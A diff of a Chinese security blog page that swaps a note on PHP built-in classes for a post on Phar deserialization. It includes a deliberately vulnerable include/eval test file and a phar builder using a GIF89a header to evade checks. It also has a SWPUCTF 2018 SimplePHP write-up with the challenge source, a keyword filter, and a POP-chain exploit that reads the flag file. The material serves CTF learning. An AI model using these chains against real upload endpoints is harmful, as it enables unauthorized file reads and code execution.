@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php内置类积累, Keep-Boom">
+    <meta name="keywords" content="Phar反序列化, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php内置类积累 | Keep-Boom</title>
+    <title>Phar反序列化 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php内置类积累</h1>
+                    <h1 class="description center-align post-title">Phar反序列化</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-27
+                    2021-03-28
                 </div>
                 
 
@@ -459,10 +459,210 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。"><a href="#以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。" class="headerlink" title="以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。"></a>以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。</h3><h4 id="FilesystemIterator-file-path-PHP-5-gt-5-3-0-PHP-7"><a href="#FilesystemIterator-file-path-PHP-5-gt-5-3-0-PHP-7" class="headerlink" title="FilesystemIterator(file_path)(PHP 5 &gt;= 5.3.0, PHP 7)"></a>FilesystemIterator(file_path)(PHP 5 &gt;= 5.3.0, PHP 7)</h4><p>获取目录第一个文件名称，如果该目录下存在php文件，会获取到第一个php文件名称。</p>
-<h4 id="SplFileObject-file-name-PHP-5-gt-5-1-0-PHP-7"><a href="#SplFileObject-file-name-PHP-5-gt-5-1-0-PHP-7" class="headerlink" title="SplFileObject(file_name)(PHP 5 &gt;= 5.1.0, PHP 7)"></a>SplFileObject(file_name)(PHP 5 &gt;= 5.1.0, PHP 7)</h4><p>用于对文件遍历、查找、操作</p>
-<h4 id="ZipArchive-file-name-PHP-5-gt-5-2-0-PHP-7-PHP-8-PECL-zip-gt-1-1-0"><a href="#ZipArchive-file-name-PHP-5-gt-5-2-0-PHP-7-PHP-8-PECL-zip-gt-1-1-0" class="headerlink" title="ZipArchive(file_name,)(PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0)"></a>ZipArchive(file_name,)(PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0)</h4><p>类里的open方法可以用于删除文件。**<code>ZipArchive::OVERWRITE</code>**是数值9</p>
-<h3 id="不定时跟新总结"><a href="#不定时跟新总结" class="headerlink" title="不定时跟新总结"></a>不定时跟新总结</h3>
+                <h3 id="Phar本地测验"><a href="#Phar本地测验" class="headerlink" title="Phar本地测验"></a>Phar本地测验</h3><pre><code>&lt;?php
+$filename=$_GET[&#39;filename&#39;];
+class AnyClass&#123;
+    function __destruct()
+    &#123;
+        eval($this -&gt;data);
+    &#125;
+&#125;
+include ($filename);
+?&gt;</code></pre>
+<pre><code>&lt;?php
+class AnyClass&#123;
+    function __destruct()
+    &#123;
+        eval($this -&gt;data);
+    &#125;
+&#125;
+ $a = new AnyClass();
+ $a-&gt;data = &quot;phpinfo();&quot;;
+ $phar = new Phar(&quot;1.phar&quot;);//创建一个文件，后缀必须是phar
+ $phar-&gt;startBuffering();
+ $phar-&gt;setStub(&quot;GIF89a&quot;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);//php解析时是看这句来识别phar文件的 __HALT_COMPILER();？&gt;,前面可以加上GIF89a的头，来绕过一些检测
+ $phar-&gt;setMetadata($a);//以序列化的形式存储用户自定义的meta-data，phar://伪协议解析的时候，都会将meta-data进行反序列化
+ $phar-&gt;addFromString(&quot;text.txt&quot;,&quot;text&quot;);
+ $phar-&gt;stopBuffering();
+
+?&gt;</code></pre>
+<p>在该目录下生成1.phar的文件。</p>
+<p>然后GET传参 filename=phar://1.phar解析文件，出现phpinfo()详细信息，成功。</p>
+<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>在文件查看那个位置进行文件包含，查看能得到文件的源码。</p>
+<pre><code>#file.php
+&lt;?php 
+header(&quot;content-type:text/html;charset=utf-8&quot;);  
+include &#39;function.php&#39;; 
+include &#39;class.php&#39;; 
+ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
+$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
+if(empty($file)) &#123; 
+    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
+&#125; 
+$show = new Show(); 
+if(file_exists($file)) &#123; 
+    $show-&gt;source = $file; 
+    $show-&gt;_show(); 
+&#125; else if (!empty($file))&#123; 
+    die(&#39;file doesn\&#39;t exists.&#39;); 
+&#125; 
+?&gt; </code></pre>
+<pre><code>#function.php
+&lt;?php 
+//show_source(__FILE__); 
+include &quot;base.php&quot;; 
+header(&quot;Content-type: text/html;charset=utf-8&quot;); 
+error_reporting(0); 
+function upload_file_do() &#123; 
+    global $_FILES; 
+    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
+    //mkdir(&quot;upload&quot;,0777); 
+    if(file_exists(&quot;upload/&quot; . $filename)) &#123; 
+        unlink($filename); 
+    &#125; 
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
+    echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; 
+&#125; 
+function upload_file() &#123; 
+    global $_FILES; 
+    if(upload_file_check()) &#123; 
+        upload_file_do(); 
+    &#125; 
+&#125; 
+function upload_file_check() &#123; 
+    global $_FILES; 
+    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
+    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
+    $extension = end($temp); 
+    if(empty($extension)) &#123; 
+        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
+    &#125; 
+    else&#123; 
+        if(in_array($extension,$allowed_types)) &#123; 
+            return true; 
+        &#125; 
+        else &#123; 
+            echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;; 
+            return false; 
+        &#125; 
+    &#125; 
+&#125; 
+?&gt;</code></pre>
+<pre><code>#class.php
+&lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+    public function __construct($name)
+    &#123;
+        $this-&gt;str = $name;
+    &#125;
+    public function __destruct()
+    &#123;
+        $this-&gt;test = $this-&gt;str;
+        echo $this-&gt;test;
+    &#125;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+    public function __construct($file)
+    &#123;
+        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
+        echo $this-&gt;source;
+    &#125;
+    public function __toString()
+    &#123;
+        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;
+        return $content;
+    &#125;
+    public function __set($key,$value)
+    &#123;
+        $this-&gt;$key = $value;
+    &#125;
+    public function _show()
+    &#123;
+        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;
+            die(&#39;hacker!&#39;);
+        &#125; else &#123;
+            highlight_file($this-&gt;source);
+        &#125;
+
+    &#125;
+    public function __wakeup()
+    &#123;
+        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+            echo &quot;hacker~&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &#123;
+        $this-&gt;params = array();
+    &#125;
+    public function __get($key)
+    &#123;
+        return $this-&gt;get($key);
+    &#125;
+    public function get($key)
+    &#123;
+        if(isset($this-&gt;params[$key])) &#123;
+            $value = $this-&gt;params[$key];
+        &#125; else &#123;
+            $value = &quot;index.php&quot;;
+        &#125;
+        return $this-&gt;file_get($value);
+    &#125;
+    public function file_get($value)
+    &#123;
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    &#125;
+&#125;
+?&gt; </code></pre>
+<p>POP链 C1e4r类的echo $this-&gt;test,可以触发Show类的__toString(),接着Show类的$this-&gt;str[‘str’]-&gt;source，可以用来触发Test类的 _get() -&gt;触发get函数 -&gt;触发file_get函数 base64打印出文件。</p>
+<p>exp</p>
+<p>这里有个地方很奇怪，读取 flag 只能用决定路径，不能使用相对路径</p>
+<pre><code>&lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;   
+&#125;
+$a = new C1e4r();
+$b = new Show();
+$c = new Test();
+$a-&gt;str = $b;
+$b-&gt;str[&#39;str&#39;] = $c;
+$c-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;
+$phar = new Phar(&#39;2.phar&#39;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);
+$phar-&gt;setMetadata($a);
+$phar-&gt;addFromString(&#39;text.txt&#39;,&#39;text&#39;);
+$phar-&gt;stopBuffering();
+?&gt; </code></pre>
+<p>然后进upload查看下新生成的文件名，利用文件包含执行phar://来解析文件，修改下后缀名绕过。</p>
+
             </div>
             <hr/>
 
@@ -487,7 +687,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/27/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%A7%AF%E7%B4%AF/">http://example.com/2021/03/27/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%A7%AF%E7%B4%AF/</a>
+                    <a href="http://example.com/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -692,9 +892,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
@@ -712,9 +913,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -723,6 +924,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -733,13 +935,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/26/php%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+                <a href="/2021/03/27/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%A7%AF%E7%B4%AF/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="php各种漏洞总结">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="php内置类积累">
                         
-                        <span class="card-title">php各种漏洞总结</span>
+                        <span class="card-title">php内置类积累</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -750,7 +952,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-27
                             </span>
                         <span class="publish-author">
                             
